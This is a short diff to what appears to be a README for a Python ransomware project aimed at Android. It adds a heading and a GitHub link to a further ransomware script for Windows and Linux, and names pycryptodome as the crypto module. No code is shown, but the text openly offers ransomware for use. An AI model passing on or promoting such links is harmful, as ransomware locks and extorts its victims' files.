@@ -9,3 +9,6 @@ This is a ransomware written in Python language, for Android; which can find the
 
 
 - Module used : crypto => pycryptodome
+
+### Windows & Linux ransomware 
+<a href="https://github.com/esfelurm/EsFeLuRm/blob/main/ransomware.py"> ransomware => windows - Linux</a>
